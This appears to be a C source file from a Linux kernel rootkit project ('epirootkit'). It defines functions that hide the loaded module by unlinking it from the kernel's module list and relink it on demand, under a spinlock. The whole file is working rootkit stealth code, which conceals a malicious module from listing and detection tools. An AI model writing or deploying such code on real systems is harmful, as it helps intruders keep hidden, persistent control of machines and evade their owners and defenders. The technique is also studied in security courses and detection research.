#include "epirootkit.h"

static struct list_head *prev_module;
static bool module_hidden = false;
static DEFINE_SPINLOCK(hide_lock);

int hide_module(void)
{
    unsigned long flags;

    spin_lock_irqsave(&hide_lock, flags);
    if (module_hidden) {
        spin_unlock_irqrestore(&hide_lock, flags);
        return SUCCESS;
    }

    /* remember where we were, then unlink */
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = true;

    spin_unlock_irqrestore(&hide_lock, flags);
    return SUCCESS;
}

int unhide_module(void)
{
    unsigned long flags;

    spin_lock_irqsave(&hide_lock, flags);
    if (!module_hidden) {
        spin_unlock_irqrestore(&hide_lock, flags);
        return SUCCESS;
    }

    list_add(&THIS_MODULE->list, prev_module);
    module_hidden = false;

    spin_unlock_irqrestore(&hide_lock, flags);
    return SUCCESS;
}